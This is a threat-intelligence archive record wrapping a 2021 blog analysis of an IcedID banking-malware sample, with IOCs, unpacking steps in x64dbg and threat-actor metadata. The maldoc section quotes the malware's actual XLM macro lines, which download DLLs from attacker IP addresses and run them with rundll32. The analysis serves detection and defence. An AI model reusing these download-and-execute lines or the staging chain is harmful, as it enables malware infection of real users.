{
    "id": "00889f04-ffb8-42f0-8246-852f6d66fd0e",
    "created_at": "2023-01-12T15:06:30.858906Z",
    "updated_at": "2025-03-27T02:14:12.243199Z",
    "deleted_at": null,
    "sha1_hash": "4e36ba36404f50bad68d575b15757e92c6df8d11",
    "title": "2021-04-09 - IcedID Analysis",
    "authors": "",
    "file_creation_date": "2022-05-27T19:11:25Z",
    "file_modification_date": "2022-05-27T19:11:25Z",
    "file_size": 2026761,
    "plain_text": "# IcedID Analysis\n\n**aaqeel01.wordpress.com/2021/04/09/icedid-analysis/**\n\nAli Aqeel April 9, 2021\n\n[IcedID aka (BokBot) is banking malware designed to steal financial information. Lunar Spider is the threat actor behind IcedID which](https://malpedia.caad.fkie.fraunhofer.de/details/win.icedid)\nthey’ve been running campaigns since at least 2017. Beside stealing banking information, some incident show that IcedID is an entry stage\nto ransomware or RAT attack. It’s been observed lately that the threat actor has been using new techniques to evade detection by endpoint\nsecurity, sandbox, and anti-reversing. Which makes it interesting to try dissecting samples to find out indicators and other artifacts that\ncould be missed by security tools.\n\n[In this post, will take a look at IcedID sample that’s been posted on Malware-traffic-analysis.net. Will walkthrough each artifact to learn how](https://www.malware-traffic-analysis.net/2021/03/19/index.html)\nto unpack the hidden malicious binaries. These techniques would also work on other IcedID samples that has been found lately.\n\n## behaviour overview\n\nThreat actor send an email with attached ZIP archived including maldoc either MS Word or Excel spreadsheet. When opening the the\nmaldoc it asks to enable macros. Once enabled two function happens first download a DLL file and run it in a process using ‘rundll32.exe’.\nThe downloaded DLL has unknown extension. After running in process, the DLL file ‘Installer’ does mainly two things: download a GZIP\ncompressed binary and install it. The GZIP might have zip extension, but it can’t be open or extracted with any archived tool. The GZIP\nmainly a dropper, it’s packed with two binaries. without further ado let’s get started with the below artifacts.\n\nFile Name Description File Type SHA256\n\n\n[82025721897_03192021.xlsm](https://www.virustotal.com/gui/file/dcc45c82a484a420888aabe66588cbb1658cb2a7a5cc833b0438fa06ca84a991/relations) Maldoc Excel\nspreadsheet\n\n\ndcc45c82a484a420888aabe66588cbb1658cb2a7a5cc833b0438fa06ca84a991\n\n\n[Kiod.hod](https://www.virustotal.com/gui/file/d1634c8dd16b4b1480065039fac62d6c1900692f0ccc9bf52c8ddc65599fbf3d/details) Installer\nDLL\n\n[suit_32.tmp](https://www.virustotal.com/gui/file/b8502cc6fd41a558012e7ccd0a7f4e0ed5746bf106b8bf5b6a27ef9cba18a9e3/detection) Temporary\nDLL\n\n[Oxiwko.dll](https://www.virustotal.com/gui/file/48b72914126b6b4a3e5aefa9bc8d5eac1187543eb0fa42c98a70a2f2ad07a60a/detection) Persistent\nDLL\n\n\nDLL d1634c8dd16b4b1480065039fac62d6c1900692f0ccc9bf52c8ddc65599fbf3d\n\nDLL b8502cc6fd41a558012e7ccd0a7f4e0ed5746bf106b8bf5b6a27ef9cba18a9e3\n\nDLL 48b72914126b6b4a3e5aefa9bc8d5eac1187543eb0fa42c98a70a2f2ad07a60a\n\n\n[license.dat](https://www.virustotal.com/gui/file/45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865/details) IcedID DLL!\n(encrypted)\n\nTable 1, List of IcedID artifacts to analyze\n\n\n45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\n\n\n-----\n\n## maldoc\n\nOne of the most recognized templated of IcedID spreadsheet that hides beside it XLM 4.0 functions to download and run process once hit\nEnable Content as typical maldoc.\n\nFigure 2, IcedID template\n\nIcedID use “Auto_Open” function to execute the entire XLM (4.0) script. Moving between sheets and cells, it’s possible to debug the\nfunction step-by-step, but what’s worthy is to get IOCs which is in clear text.\n\n\n-----\n\n```\n--------Shell Command -------------------Rundll32 ..\\Kiod.hod2,DllRegisterServer\n-------------------------------------------------Contacted IP Addresses ----------188.127.237.152\n45.150.67.13\n185.82.219.225\n--------------------------------------------------Calls -------------------------=CALL(\"URLMon\", \"URLDownloadToFileA\", \"JCCB\", 0, \"http://188.127.237.152/44295.4021160879.dat\", \"..\\Kiod.hod\")\n=CALL(\"URLMon\", \"URLDownloadToFileA\", \"JCCB\", 0, \"http://45.150.67.13/44295.4021160879.dat\", \"..\\Kiod.hod1\")\n=CALL(\"URLMon\", \"URLDownloadToFileA\", \"JCCB\", 0, \"http://185.82.219.225/44295.4021160879.dat\", \"..\\Kiod.hod2\")\n-----------------------------------------\n```\n[Figure 3, Maldoc behavioral from Tria.ge sandbox](https://tria.ge/210409-fe4hz1v8za/behavioral1)\n\n## installer dll\n\n‘Kiod.hod’ is the name of the first stage IcedID execution in this sample. It’s a 64-bit DLL with MZ header running in a ‘rundll32’ create\n[process from the maldoc. when checking the sample on Hatching Triage sandbox, the network shows requests to ‘aws.amazon[.]com‘ and](https://tria.ge/210409-1lbtlvfs32/behavioral1)\n‘calldivorce[.]fun‘. The installer download a GZIP file and install it. It’s not possible to view the network indicators when on statically\nanalyzing this sample, nor when debugging it which is mostly sign of packed executable.\n\nFigure 4, Installer behavioral on\n\ntria.ge sandbox\n\n\n-----\n\nThere s one library kernel32.dll and no sign of imported APIs to help guide either statically or in debugger in order to unleash any\nindicators. Simply loading the sample on x64dbg doesn’t work! There’re multiple ways to unpack the installer DLL, however, the quick and\npossible way to unpack the binary by attaching the installer DLL to (~Windows\\System32\\rundll32) in x64dbg like steps below:\n```\n1. x64dbg -> File -> Open -> C:\\Windows\\System32\\rundll32.exe\n2. x64dbg -> File -> Change Command Line -> \"C:\\Windows\\System32\\rundll32.exe\" \"C:\\Users\\~\\lab\\Kiod.dll\",DllRegisterServer \n* no spaces except the single space between \" \" and copy the full DLL directory\n** DllRegisterServer is the export function\n3. After hitting ok, go to Options -> Preferences -> Events tab -> check ✔ DLL Entry\n4. Hit F9 (few seconds and pause)\n\n```\nDirectly after pausing you can notice see the register ‘R14’ got PE sign and ready to Save Memory Region by dump it from Memory Map.\nThe unpacked executable seems to be unmapped to memory and no changes required to addresses on the sections headers.\n\n\n-----\n\n-----\n\nFigure 5, unpack IcedID installer\n```\n---------------------------------Unpacked Installer - unpacked file\n---------------------------------SHA256: 7459E88626A90B52C3392A14734D00A5238EDBF13C61907F39326DF2D4C3F922\nHOST IOC: C:\\ProgramData\\\nNetwork IOC: aws.amazon.com\n       calldivorce.fun/~[GZIP file]\nsubmitted sample on (9 April 2021)\n23/61 VT: https://www.virustotal.com/gui/file/7459e88626a90b52c3392a14734d00a5238edbf13c61907f39326df2d4c3f922/detection\n10/10 Triage: https://tria.ge/210409-af3skeevmx/behavioral2\nother highlighted IOCs\nLibraries\n   winhttp.dll\nImports (APIs)\nLookupAccountNameW,advapi32.dll\nWinHttpQueryDataAvailable,winhttp.dll\nWinHttpConnect,winhttp.dll\nWinHttpSetStatusCallback,winhttp.dll\nWinHttpSendRequest,winhttp.dll\nWinHttpCloseHandle,winhttp.dll\nWinHttpSetOption,winhttp.dll\nWinHttpOpenRequest,winhttp.dll\nWinHttpReadData,winhttp.dll\nWinHttpQueryHeaders,winhttp.dll\nWinHttpOpen,network,winhttp.dll\nWinHttpReceiveResponse,winhttp.dll\nWinHttpQueryOption,winhttp.dll\nCreateProcessA,kernel32.dll\nSwitchToThread,kernel32.dll\n\n```\nIt’s clear what APIs and libraries the original packed installer hiding which is detectable by any endpoint security as can see in Pestudio.\nFurther disassembling with Cutter 2.0.0 the unpacked DLL to get indicators.\n\n\n-----\n\n-----\n\nFigure 6, Pestudio and Cutter views of unpacked installer\n\n## TEMPORARY DLL\n\nsuit_32.tmp, is another 64-bit DLL. It dropped from GZIP with the ‘license.dat’ binary. Located in %temp% directory\n\n_C:\\Users[username]\\AppData\\Local\\Temp\\suit_32.tmp_\n\nThe main purpose of this temporary DLL to initiate persistent with ‘license.dat’ and later copy itself to another directory for persistent.\n\n_Run method: rundll32.exe [filename],update /i:”LuxuryQuarter\\license.dat”_\n\nThis artifact is also well packed for evasion and anti-analysis purposes. like the ‘installer’ no libraries or API to get hint where to breakpoint.\nTo unpack :\n```\n1. Load 'suit_32.tmp' in x64dbg\n2. Either single or over stepping till reaching [RtlExitUserProcess] API function\n3. Check the stack or RDI register for MZ header. \n4. Dump from Memory Map\n\n```\nThe unpacked requires addresses matching because it were mapped to memory.\n\n\n-----\n\n-----\n\nFigure 7, x64dbg to unpack temporary DLL\n```\n----------------------------Temporary DLL - unpacked file\n----------------------------SHA256: AD435DB375665D157AED16BA8B51735B65AC6AEE86864DA78408B44C9D85093B\nHOST IOC: C:\\ProgramData\\\nNetwork IOC: N/A\nSummitted sample on (4 April 2021)\n15/69 VT: https://www.virustotal.com/gui/file/ad435db375665d157aed16ba8b51735b65ac6aee86864da78408b44c9d85093b/detection\n1/10 Triage: https://tria.ge/210403-1sm7qxep8n/behavioral2\nOther highlighted IOCs\nImports (APIs)\nVirtualProtect, Kernel32.dll\nGetModuleFileNameA, Kernel32.dll\n\n```\n[As compared with the packed version there’s a new C2 based on Triage sandbox analysis!](https://tria.ge/210330-kch6ynzec2/behavioral2)\n\n\n-----\n\n/update/ 10 Apr\n\nit’s been brought up by community that the upper IPs are not C2s.\n\n## Persistent DLL\n\n‘Oxiwko.dll’, suppose to be a copy from the previous temporary DLL. Big picture from Entropy view and Pestudio shows the resemblance.\nWhich makes it easy to unpack this sample using same method above with the temporary DLL.\n\n\n-----\n\nFigure 8, Persistent DLL matching with temp DLL\n```\n-----------------------------Persistent DLL - unpacked file\n-----------------------------SHA256: c04101f36a7d1498379ff6abb2218a2730ad896908e525cd3664ea5cc4a56a18\nHOST IOC: C:\\ProgramData\\\nNetwork IOC: N/A\nSummitted sample on VT and Tria.ge (9 April 2021)\n21/69 VT: https://www.virustotal.com/gui/file/c04101f36a7d1498379ff6abb2218a2730ad896908e525cd3664ea5cc4a56a18/detection\n1/10 Triage: https://tria.ge/210409-tdel4edx32/static1\nOther highlighted IOCs\nImports (APIs)\nVirtualProtect, Kernel32.dll\nGetModuleFileNameA, Kernel32.dll\n\n```\n\n-----\n\nThere s not any network indicator in either packed or unpacked which make sense, because the very purpose of this file is persistent in\nTask Scheduler to load ‘license.dat’.\n\nFigure 9, Persistent [snap from malware-traffic-analysis]\n\n## IcedID (license.dat)\n\nLeaving the beast for last! Even-though it’s been summited to VT by early March 1st, 2021. It’s still unrecognized by many vendors that\n‘license.dat’ is the IcedID.\n\n[Huge credit to BinaryDefense team for their efforts building the decryption tool for this part of IcedID and giving it a way on Github.](https://github.com/BinaryDefense/IcedDecrypt)\n\nThe unknown ‘license.dat’ encrypted binary is running on Task Scheduler with the persistent DLL. As it turns out the unknown binary is also\n64-bit DLL. Unlike the previous DLL, this is different kind of beast and this is what IcedID (BokBot) is all about. The decryption does a good\njob dissecting readable DLL from encrypted binary. However, due to very complication of this part is only possible to disassemble it in IDA,\nCutter and other kind of disassemble tools. It’s not possible to debug it.\n\nNever the less, it’s possible to reverse engineer the function with proper disassembler to unleash the behavior which by looking at it’s API\nlist seems to be detectable by Endpoints. The main functions of ‘license.dat’ is collecting host and user information and connecting to C2.\n\n\n-----\n\nFigure 10, Decrypted license.dat\n\n\n-----\n\n```\nDecrypted license.dat file\n--------------------------SHA256: 66b6a55b67c0201a02dbdc4a2ef3c3f2d57aaadbbefa61c1bcdb59b96fb86743\nsubmitted on VT and Triage on (9 April 2021)\n16/67 VT: https://www.virustotal.com/gui/file/66b6a55b67c0201a02dbdc4a2ef3c3f2d57aaadbbefa61c1bcdb59b96fb86743/detection\n1/10 triage: https://tria.ge/210409-1satexfe4j\n\n```\nFurther analysis will be taken to further analyze IcedID campaigns in general and ‘license.dat’ in particular to further understand its\nbehavior.\n\nTO BE CONTINUED….\n\n**Credit**\n\n[To BinaryDefense, https://www.binarydefense.com/icedid-gziploader-analysis/ for providing the decryption tool](https://www.binarydefense.com/icedid-gziploader-analysis/)\n\nTo Malware Traffic Analysis, _[https://www.malware-traffic-analysis.net/ for the artifacts, WireShark packets](https://www.malware-traffic-analysis.net/)_\n\n**References**\n\n[https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)\n\n[https://www.group-ib.com/blog/icedid](https://www.group-ib.com/blog/icedid)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-09 - IcedID Analysis.pdf"
    ],
    "report_names": [
        "2021-04-09 - IcedID Analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "475ea823-9e47-4098-b235-0900bc1a5362",
            "created_at": "2022-10-25T16:07:24.506596Z",
            "updated_at": "2025-03-27T02:02:10.263346Z",
            "deleted_at": null,
            "main_name": "Lunar Spider",
            "aliases": [
                "Gold SwathMore"
            ],
            "source_name": "ETDA:Lunar Spider",
            "tools": [
                "BokBot",
                "IceID",
                "IcedID",
                "NeverQuest",
                "Vawtrak",
                "grabnew"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c2385aea-d30b-4dbc-844d-fef465cf3ea9",
            "created_at": "2023-01-06T13:46:38.916521Z",
            "updated_at": "2025-03-27T02:00:02.950071Z",
            "deleted_at": null,
            "main_name": "LUNAR SPIDER",
            "aliases": [
                "GOLD SWATHMORE"
            ],
            "source_name": "MISPGALAXY:LUNAR SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7cfe3bc9-7a6c-4ee1-a635-5ea7b947147f",
            "created_at": "2024-06-19T02:03:08.122318Z",
            "updated_at": "2025-03-27T02:05:17.398805Z",
            "deleted_at": null,
            "main_name": "GOLD SWATHMORE",
            "aliases": [
                "Lunar Spider "
            ],
            "source_name": "Secureworks:GOLD SWATHMORE",
            "tools": [
                " GlobeImposter",
                " Gozi",
                " Gozi Trojan",
                " IcedID",
                " Latrodectus",
                " TrickBot",
                " TrickBot",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535990,
    "ts_updated_at": 1743041652,
    "ts_creation_date": 1653678685,
    "ts_modification_date": 1653678685,
    "files": {
        "pdf": "https://archive.orkl.eu/4e36ba36404f50bad68d575b15757e92c6df8d11.pdf",
        "text": "https://archive.orkl.eu/4e36ba36404f50bad68d575b15757e92c6df8d11.txt",
        "img": "https://archive.orkl.eu/4e36ba36404f50bad68d575b15757e92c6df8d11.jpg"
    }
}